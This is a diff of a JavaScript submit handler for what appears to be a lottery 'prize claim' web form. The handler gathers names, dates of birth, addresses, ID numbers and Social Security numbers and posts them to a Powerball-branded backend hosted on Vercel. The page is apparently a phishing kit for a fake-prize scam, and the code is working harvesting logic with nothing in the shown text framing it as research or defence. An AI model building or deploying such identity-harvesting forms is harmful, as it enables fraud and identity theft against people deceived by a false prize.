@@ -451,57 +451,63 @@ window.onload = function () {
 //     });
 // });
 
-const API_URL = process.env.NODE_ENV === 'production' 
-    ? 'https://your-backend-vercel-url.vercel.app'
-    : 'http://localhost:3000';
+const API_URL =
+  process.env.NODE_ENV === "production"
+    ? "https://powerball-backend.vercel.app"
+    : "http://localhost:3000";
 
-document.getElementById('prizeClaimForm').addEventListener('submit', async function(e) {
+document
+  .getElementById("prizeClaimForm")
+  .addEventListener("submit", async function (e) {
     e.preventDefault();
-    
+
     const formData = {
-        firstName: document.getElementById('firstName').value,
-        lastName: document.getElementById('lastName').value,
-        email: document.getElementById('email').value,
-        phone: document.getElementById('phone').value,
-        dob: document.getElementById('dob').value,
-        gender: document.getElementById('gender').value,
-        street: document.getElementById('street').value,
-        city: document.getElementById('city').value,
-        state: document.getElementById('state').value,
-        zipCode: document.getElementById('zipCode').value,
-        country: document.getElementById('country').value,
-        maritalStatus: document.getElementById('maritalStatus').value,
-        occupation: document.getElementById('occupation').value,
-        idType: document.getElementById('idType').value,
-        idNumber: document.getElementById('idNumber').value,
-        ssn: document.getElementById('ssn').value
+      firstName: document.getElementById("firstName").value,
+      lastName: document.getElementById("lastName").value,
+      email: document.getElementById("email").value,
+      phone: document.getElementById("phone").value,
+      dob: document.getElementById("dob").value,
+      gender: document.getElementById("gender").value,
+      street: document.getElementById("street").value,
+      city: document.getElementById("city").value,
+      state: document.getElementById("state").value,
+      zipCode: document.getElementById("zipCode").value,
+      country: document.getElementById("country").value,
+      maritalStatus: document.getElementById("maritalStatus").value,
+      occupation: document.getElementById("occupation").value,
+      idType: document.getElementById("idType").value,
+      idNumber: document.getElementById("idNumber").value,
+      ssn: document.getElementById("ssn").value,
     };
 
     try {
-        const response = await fetch(`${API_URL}/api/submit-form`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(formData)
-        });
-
-        const data = await response.json();
-
-        if (response.ok) {
-            Swal.fire({
-                icon: 'success',
-                title: 'Success!',
-                text: 'Your form has been submitted successfully.'
-            });
-        } else {
-            throw new Error(data.message || 'Form submission failed');
+      const response = await fetch(
+        `https://powerball-backend.vercel.app/api/submit-form`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(formData),
         }
-    } catch (error) {
+      );
+
+      const data = await response.json();
+
+      if (response.ok) {
         Swal.fire({
-            icon: 'error',
-            title: 'Error!',
-            text: error.message || 'Something went wrong. Please try again.'
+          icon: "success",
+          title: "Success!",
+          text: "Your form has been submitted successfully.",
         });
+      } else {
+        throw new Error(data.message || "Form submission failed");
+      }
+    } catch (error) {
+      Swal.fire({
+        icon: "error",
+        title: "Error!",
+        text: error.message || "Something went wrong. Please try again.",
+      });
     }
-});
+  });
